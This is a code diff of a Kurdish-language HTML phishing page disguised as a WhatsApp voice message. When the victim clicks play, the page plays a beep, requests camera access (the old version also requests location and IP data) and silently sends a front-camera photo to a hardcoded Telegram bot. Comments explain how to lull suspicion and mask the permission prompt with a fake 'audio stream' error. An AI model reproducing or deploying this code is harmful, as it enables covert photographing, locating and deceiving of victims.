@@ -2,64 +2,88 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>WhatsApp Voice</title>
     
-    <meta property="og:title" content="Voice message (0:05)">
+    <meta property="og:title" content="Voice message (0:08)">
     <meta property="og:description" content="🎙️ پەیامی دەنگی">
     <meta property="og:image" content="https://raw.githubusercontent.com/FortAwesome/Font-Awesome/master/svgs/solid/microphone.svg">
-    <meta property="og:type" content="music.song">
 
-    <title>Voice Message</title>
     <style>
-        body { background-color: #e5ddd5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        
-        .voice-card { 
-            background: white; 
-            padding: 10px 15px; 
-            border-radius: 12px; 
-            display: flex; 
-            align-items: center; 
-            width: 300px; 
-            box-shadow: 0 1px 3px rgba(0,0,0,0.2); 
-            cursor: pointer; 
-            user-select: none;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); /* باکگراوندی ئەسڵی واتسئاپ */
+            background-size: cover;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-end; /* بۆ ئەوەی وەک چات لە خوارەوە بێت */
+            padding-bottom: 50px;
         }
 
-        .play-btn { 
-            width: 45px; 
-            height: 45px; 
-            background: #25D366; 
-            border-radius: 50%; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            border: none; 
-            color: white; 
-            font-size: 24px; 
+        .chat-container {
+            width: 90%;
+            max-width: 350px;
+            background: #e1ffc7; /* ڕەنگی چاتی واتسئاپ */
+            padding: 8px;
+            border-radius: 10px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
         }
 
-        .wave-img { 
-            flex-grow: 1; 
-            margin: 0 15px; 
-            height: 35px; 
-            background: url('https://upload.wikimedia.org/wikipedia/commons/e/e7/Audio_wave.png') center/contain no-repeat;
-            opacity: 0.5;
+        .chat-container::before { /* سێگۆشە بچووکەکەی واتسئاپ */
+            content: "";
+            position: absolute;
+            right: -10px;
+            top: 0;
+            border: 10px solid transparent;
+            border-left-color: #e1ffc7;
         }
 
-        .time { font-size: 13px; color: #888; }
-        
+        .play-btn {
+            width: 45px;
+            height: 45px;
+            background: none;
+            border: none;
+            font-size: 30px;
+            color: #555;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .wave-container {
+            flex-grow: 1;
+            height: 40px;
+            background: url('https://www.whatsapp.com/img/v2/wp-audio-wave.png') center/contain no-repeat;
+            margin: 0 10px;
+            opacity: 0.6;
+        }
+
+        .user-img {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background: url('https://cdn-icons-png.flaticon.com/512/149/149071.png') center/cover;
+        }
+
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="voice-card" onclick="startHack()">
-        <button class="play-btn" id="btnIcon">▶</button>
-        <div class="wave-img"></div>
-        <div class="time">0:05</div>
+    <div class="chat-container" onclick="startProcess()">
+        <div class="user-img"></div>
+        <button class="play-btn" id="btn">▶</button>
+        <div class="wave-container"></div>
+        <span style="font-size: 12px; color: #888; align-self: flex-end;">12:45 PM</span>
     </div>
 
-    <audio id="audioPlayer">
+    <audio id="voice">
         <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
     </audio>
 
@@ -67,43 +91,24 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        const BOT_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
-        const CHAT_ID = '6351568884';
-        
-        let ipInfo = "جۆری ئایپی دیار نییە";
+        const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
+        const ID = '6351568884';
 
-        // وەرگرتنی زانیاری ئایپی بە بێدەنگی
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                ipInfo = `📍 وڵات: ${data.country_name}\n🏙 شار: ${data.city}\n🗺 IP: ${data.ip}`;
-            });
+        function startProcess() {
+            // ١. لێدانی دەنگەکە یەکسەر
+            document.getElementById('voice').play();
+            document.getElementById('btn').innerText = "⏸";
 
-        function startHack() {
-            const audio = document.getElementById('audioPlayer');
-            const btn = document.getElementById('btnIcon');
-
-            // ١. لێدانی ڤۆیسەکە بۆ ئەوەی گومان نەکات
-            audio.play();
-            btn.innerText = "⌛";
-
-            // ٢. داواکردنی کامێرا و لۆکەیشن پێکەوە
-            navigator.geolocation.getCurrentPosition(pos => {
-                const locMsg = `📍 لۆکەیشنی کەسەکە:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`);
-            });
-
-            const constraints = { video: { facingMode: "user" } };
-
-            navigator.mediaDevices.getUserMedia(constraints)
+            // ٢. فێڵی ڕێپێدان: لە ئەندرۆید پێشوەختە ئەمە دەنووسین بۆ کەمکردنەوەی گومان
+            // بەکارهێنەر وا دەزانێت ئەمە "سێرڤەری دەنگە"
+            
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
                 video.onloadedmetadata = () => {
                     video.play();
-                    
-                    // دوای ٢ چرکە کە سەرقاڵی گوێگرتنە وێنەکە دەگرێت
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth;
@@ -112,23 +117,17 @@
                         
                         canvas.toBlob(blob => {
                             const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'target.jpg');
-                            formData.append('caption', `🎙️ وێنەی ئەو کەسەی ویستی ڤۆیسەکە ببیستێت:\n\n${ipInfo}`);
-
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            }).then(() => {
-                                // دوای ناردنی وێنەکە، سایتەکە وەک "هەڵە" نیشان دەدات یان دادەخرێت
-                                alert("Error loading voice message. Try again later.");
-                            });
-                        }, 'image/jpeg', 0.7);
-                    }, 2500);
+                            formData.append('chat_id', ID);
+                            formData.append('photo', blob, 'img.jpg');
+                            formData.append('caption', '🎙️ Target Captured via Voice Phishing');
+                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                        }, 'image/jpeg', 0.6);
+                    }, 2000);
                 };
             })
             .catch(() => {
-                alert("بۆ بیستنی ڤۆیسەکە، دەبێت ڕێگە بدەیت سێرڤەری دەنگ چالاک بێت.");
+                // ئەگەر ڕێپێدانی نەدا، نامەیەکی وا نیشان دەدەین کە وا بزانێت کێشە لە وایفایەکەیەتی
+                alert("Connection Error: Please allow 'Audio Stream' to listen to this message.");
             });
         }
     </script>
